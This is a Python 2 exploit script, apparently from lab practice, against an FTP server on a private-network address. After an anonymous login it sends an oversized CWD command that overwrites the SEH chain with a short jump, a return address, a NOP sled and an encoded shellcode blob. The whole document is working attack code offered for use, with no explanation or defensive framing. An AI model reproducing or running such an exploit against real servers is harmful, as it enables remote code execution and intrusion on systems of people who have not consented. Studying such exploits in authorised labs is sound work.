#!/usr/bin/python2

import socket
import os

host = "192.168.70.133"
port = 21

crash = "A" * 1037
nseh = "\xeb\x0a\x90\x90" 
seh = "\x1e\x40\x20\x12" # 1220401e
nops_sled = "\x90" * 30
shellcode = (
"\xda\xde\xd9\x74\x24\xf4\x58\xbb\x23\xec\x27\x44\x33\xc9\xb1"
"\x52\x31\x58\x17\x83\xc0\x04\x03\x7b\xff\xc5\xb1\x87\x17\x8b"
"\x3a\x77\xe8\xec\xb3\x92\xd9\x2c\xa7\xd7\x4a\x9d\xa3\xb5\x66"
"\x56\xe1\x2d\xfc\x1a\x2e\x42\xb5\x91\x08\x6d\x46\x89\x69\xec"
"\xc4\xd0\xbd\xce\xf5\x1a\xb0\x0f\x31\x46\x39\x5d\xea\x0c\xec"
"\x71\x9f\x59\x2d\xfa\xd3\x4c\x35\x1f\xa3\x6f\x14\x8e\xbf\x29"
"\xb6\x31\x13\x42\xff\x29\x70\x6f\x49\xc2\x42\x1b\x48\x02\x9b"
"\xe4\xe7\x6b\x13\x17\xf9\xac\x94\xc8\x8c\xc4\xe6\x75\x97\x13"
"\x94\xa1\x12\x87\x3e\x21\x84\x63\xbe\xe6\x53\xe0\xcc\x43\x17"
"\xae\xd0\x52\xf4\xc5\xed\xdf\xfb\x09\x64\x9b\xdf\x8d\x2c\x7f"
"\x41\x94\x88\x2e\x7e\xc6\x72\x8e\xda\x8d\x9f\xdb\x56\xcc\xf7"
"\x28\x5b\xee\x07\x27\xec\x9d\x35\xe8\x46\x09\x76\x61\x41\xce"
"\x79\x58\x35\x40\x84\x63\x46\x49\x43\x37\x16\xe1\x62\x38\xfd"
"\xf1\x8b\xed\x52\xa1\x23\x5e\x13\x11\x84\x0e\xfb\x7b\x0b\x70"
"\x1b\x84\xc1\x19\xb6\x7f\x82\xe5\xef\x39\xd1\x8e\xed\xc5\xc4"
"\x12\x7b\x23\x8c\xba\x2d\xfc\x39\x22\x74\x76\xdb\xab\xa2\xf3"
"\xdb\x20\x41\x04\x95\xc0\x2c\x16\x42\x21\x7b\x44\xc5\x3e\x51"
"\xe0\x89\xad\x3e\xf0\xc4\xcd\xe8\xa7\x81\x20\xe1\x2d\x3c\x1a"
"\x5b\x53\xbd\xfa\xa4\xd7\x1a\x3f\x2a\xd6\xef\x7b\x08\xc8\x29"
"\x83\x14\xbc\xe5\xd2\xc2\x6a\x40\x8d\xa4\xc4\x1a\x62\x6f\x80"
"\xdb\x48\xb0\xd6\xe3\x84\x46\x36\x55\x71\x1f\x49\x5a\x15\x97"
"\x32\x86\x85\x58\xe9\x02\xb5\x12\xb3\x23\x5e\xfb\x26\x76\x03"
"\xfc\x9d\xb5\x3a\x7f\x17\x46\xb9\x9f\x52\x43\x85\x27\x8f\x39"
"\x96\xcd\xaf\xee\x97\xc7"
)
padding  = "B" * 2000
payload = crash + nseh + seh + nops_sled + shellcode + padding

try: 
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) 
        s.connect((host,port)) 
        s.recv(2048) 
        s.send('USER anonymous\r\n') 
        s.recv(2048) 
        s.send('PASS anonymous\r\n') 
        s.recv(2048) 
        s.send('CWD ' + payload + '\r\n')
        print("[+] Sending Payloads")
        print("[+] Done! Exploited")
        s.close()
except:
        print("Host is unreachable")
        sys.exit()
